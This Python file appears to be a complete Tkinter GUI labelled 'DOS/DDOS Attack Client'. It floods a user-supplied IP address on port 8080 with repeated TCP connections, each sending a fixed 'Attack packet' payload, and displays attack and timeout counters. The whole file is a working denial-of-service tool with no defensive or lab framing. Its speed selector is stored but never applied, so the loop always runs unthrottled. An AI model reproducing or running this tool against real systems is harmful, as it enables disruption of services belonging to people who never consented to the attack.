import tkinter as tk
from tkinter import ttk
import socket
import threading
import time

# Global variables
attack_thread = None
attack_running = False
attack_count = 0
attack_speed = 1
timeout_count = 0
lock = threading.Lock()

def log_message(message):
    """Function to log messages to the Text widget."""
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, message + "\n")
    log_text.config(state=tk.DISABLED)
    log_text.see(tk.END)

def on_button1_click():
    """Start Attack button handler."""
    global attack_thread, attack_running
    if not attack_running:
        target_ip = entry_ip.get().strip()
        if not target_ip:
            log_message("Please enter a valid IP address.")
            return
        attack_running = True
        attack_thread = threading.Thread(target=run_attack, args=(target_ip, 8080))
        attack_thread.start()
        log_message("Attack started.")

def on_button2_click():
    """Stop Attack button handler."""
    global attack_running
    attack_running = False
    log_message("Attack stopped.")

def set_attack_speed(event):
    """Set attack speed based on selected option."""
    global attack_speed
    speed_map = {
        "Full Speed": 1000,
        "Slow": 0.1,
        "Medium": 0.5,
        "Fast": 1,
        "Ultra Speed": 10
    }
    attack_speed = speed_map.get(speed_combobox.get(), 1)

def update_stats():
    """Update the stats labels."""
    with lock:
        attack_count_label.config(text=f"Attack Count: {attack_count}")
        timeout_count_label.config(text=f"Timeout Count: {timeout_count}")
    root.after(1000, update_stats)

def run_attack(target_ip, target_port):
    """Attack function to simulate DOS attack."""
    global attack_count, timeout_count
    while attack_running:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((target_ip, target_port))
                s.sendall(b'Attack packet')
                with lock:
                    attack_count += 1
        except socket.timeout:
            with lock:
                timeout_count += 1
        except Exception as e:
            log_message(f"Error: {e}")

# GUI setup
root = tk.Tk()
root.title("DOS/DDOS Attack Client")

tk.Label(root, text="Target IP:").grid(row=0, column=0, padx=10, pady=5)
entry_ip = tk.Entry(root)
entry_ip.grid(row=0, column=1, padx=10, pady=5)

tk.Label(root, text="Attack Speed:").grid(row=1, column=0, padx=10, pady=5)
speed_combobox = ttk.Combobox(root, values=["Full Speed", "Slow", "Medium", "Fast", "Ultra Speed"])
speed_combobox.grid(row=1, column=1, padx=10, pady=5)
speed_combobox.bind("<<ComboboxSelected>>", set_attack_speed)

tk.Button(root, text="Start Attack", command=on_button1_click).grid(row=2, column=0, padx=10, pady=5)
tk.Button(root, text="Stop Attack", command=on_button2_click).grid(row=2, column=1, padx=10, pady=5)

log_text = tk.Text(root, height=10, width=50, state=tk.DISABLED)
log_text.grid(row=3, column=0, columnspan=2, padx=10, pady=5)

attack_count_label = tk.Label(root, text="Attack Count: 0")
attack_count_label.grid(row=4, column=0, padx=10, pady=5)

timeout_count_label = tk.Label(root, text="Timeout Count: 0")
timeout_count_label.grid(row=4, column=1, padx=10, pady=5)

root.after(1000, update_stats)
root.mainloop()
